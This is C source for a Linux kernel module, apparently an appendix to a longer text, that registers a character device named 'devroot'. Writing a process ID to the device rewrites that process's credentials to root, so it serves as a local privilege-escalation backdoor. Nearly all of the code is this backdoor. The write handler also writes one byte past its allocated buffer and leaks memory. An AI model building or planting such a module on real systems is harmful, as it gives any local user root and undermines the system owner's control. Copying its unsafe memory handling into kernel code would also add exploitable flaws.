// Apendicx II

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>	 	/* for file structure */
#include <asm/uaccess.h> 	/* for put_user */
#include <linux/slab.h> 	/* for kmalloc */
#include <linux/device.h>	/*device_destroy*/
#include <linux/cdev.h>		/* cdev_add */
#include <linux/platform_device.h>
#include <linux/sched.h>
#include <linux/cred.h>

int init_module(void);
void cleanup_module(void);
static int device_open(struct inode *, struct file *);
static int device_release(struct inode *, struct file *);
static ssize_t device_read(struct file *, char *, size_t, loff_t *);
static ssize_t device_write(struct file *, const char *, size_t, loff_t *);


#define SUCCESS 0
#define DEVICE_NAME "devroot" 	/* name that appears in /proc/devices */
#define BUF_LEN 80		/* Max len of msg from teh device */

static int Major; 		/* Major number assigned to our device driver */
static int Device_Open = 0; 	/* Is device open ?  used to prevent multiple access to device */
static char *msg_Ptr=NULL;

static struct file_operations fops = {
.write = device_write,
.open = device_open,
.release = device_release
};

void print_cred(struct cred mycred ) {
printk("====== Printing cred =====\n");
printk(" uid = %d \n gid = %d\n", mycred.uid, mycred.gid);
printk(" suid = %d\n sgid = %d\n", mycred.suid, mycred.sgid);
printk(" euid = %d\n egid = %d\n", mycred.euid, mycred.egid);
printk(" fsuid = %d\n fsgid = %d\n", mycred.fsuid, mycred.fsgid);
}

int root_me(int pid) {
	struct task_struct *task;
	struct cred *new_cred;

	printk("Lets search that pid supplied\n");
	for_each_process(task) {
		if(task->pid == pid)
			break;
	}
	printk("The task to be given root is  %s:%d\n",task->comm, task->pid);
	new_cred = (struct cred *)kmalloc(sizeof(struct cred), GFP_KERNEL);

	memcpy(new_cred, task->real_cred, sizeof(struct cred));

	new_cred->uid = 0;// making it root
	new_cred->gid = 0;
	new_cred->suid = 0;
	new_cred->sgid = 0;
	new_cred->euid = 0;
	new_cred->egid = 0;
	new_cred->fsuid = 0;
	new_cred->fsgid = 0;

	print_cred(*new_cred);
	print_cred(*(task->real_cred));

	memcpy(task->real_cred, new_cred, sizeof(struct cred));

	return 0;
}


int init_module(void)
{
	Major = register_chrdev(0,DEVICE_NAME, &fops);

	if(Major < 0) {
		printk(KERN_ALERT "Registering char device failed with %d\n",Major);
		return Major;
	}
	
	printk(KERN_INFO "Create a dev file with \n");
	printk(KERN_INFO "'mknod /dev/%s c %d 0'.\n", DEVICE_NAME, Major);
	
	return SUCCESS;
}

void cleanup_module(void)
{
 unregister_chrdev(Major, DEVICE_NAME);
}

static int device_open(struct inode *inode, struct file *file)
{
	if(Device_Open)
		return -EBUSY;
	Device_Open++;

	try_module_get(THIS_MODULE);
	
	return SUCCESS;
}

static int device_release(struct inode *inode, struct file *file)
{
	Device_Open--; /* we're now ready for our next caller */
	module_put(THIS_MODULE);
	return 0;
}


static ssize_t device_write(struct file *filep,
			    const char *buff,
			    size_t len,
			    loff_t *off)
{
ssize_t ret;
int pid;

msg_Ptr = (char *) kmalloc(len, GFP_KERNEL);
ret = copy_from_user( msg_Ptr, buff, len);
msg_Ptr[len]= '\0';
sscanf(msg_Ptr,"%d",&pid);

root_me(pid);
return len; 
}
